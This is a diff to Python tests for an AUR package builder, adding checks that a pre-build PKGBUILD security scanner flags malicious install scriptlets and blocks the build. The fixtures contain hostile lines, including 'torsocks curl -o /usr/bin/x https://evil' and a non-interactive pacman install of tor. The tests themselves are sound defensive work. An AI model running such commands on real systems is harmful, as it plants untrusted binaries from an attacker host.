@@ -84,6 +84,7 @@ def test_build_aur_package_full_flow(monkeypatch):
 
 def test_build_aur_package_async(monkeypatch):
     def fake_clone(name, dest):
+        os.makedirs(dest, exist_ok=True)
         return True
 
     def fake_build(workdir, chroot, run_checks, install, progress_cb):
@@ -100,3 +101,54 @@ def test_build_aur_package_async(monkeypatch):
             break
         time.sleep(0.01)
     assert results and results[0]["ok"] is True
+
+
+# ── pre-build PKGBUILD security gate ───────────────────────────────────────
+
+def test_scan_checked_out_pkgbuild_picks_scriptlets(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=foo\nsource=('a')\n")
+    (tmp_path / "foo.install").write_text(
+        "post_install() {\n  pacman -S --noconfirm tor\n}\n")
+    f = ab._scan_checked_out_pkgbuild(str(tmp_path))
+    assert any(x.get("rule") == "non-interactive pacman" for x in f)
+
+
+def test_build_aur_package_blocked_by_critical(monkeypatch):
+    def fake_clone(name, dest):
+        os.makedirs(dest, exist_ok=True)
+        with open(os.path.join(dest, "PKGBUILD"), "w") as f:
+            f.write("post_install() {\n"
+                    "  torsocks curl -o /usr/bin/x https://evil\n"
+                    "}\n")
+        return True
+
+    def fake_build(workdir, chroot, run_checks, install, progress_cb):
+        raise AssertionError("build should not run after critical findings")
+
+    monkeypatch.setattr(ab, "_run_clone", fake_clone)
+    monkeypatch.setattr(ab, "_run_build", fake_build)
+
+    res = ab.build_aur_package("evil")
+    assert res["ok"] is False
+    assert "blocked" in res["stderr"]
+    assert any(f.get("severity") == "critical"
+               for f in res.get("findings", []))
+
+
+def test_build_aur_package_clean_passes_and_reports_findings(monkeypatch):
+    def fake_clone(name, dest):
+        os.makedirs(dest, exist_ok=True)
+        with open(os.path.join(dest, "PKGBUILD"), "w") as f:
+            f.write("pkgname=hello\npkgver=1.0\n"
+                    "source=('hello.tar.gz')\n")
+        return True
+
+    def fake_build(workdir, chroot, run_checks, install, progress_cb):
+        return subprocess.CompletedProcess([], 0, "built ok", "")
+
+    monkeypatch.setattr(ab, "_run_clone", fake_clone)
+    monkeypatch.setattr(ab, "_run_build", fake_build)
+
+    res = ab.build_aur_package("hello")
+    assert res["ok"] is True
+    assert res.get("findings") == []
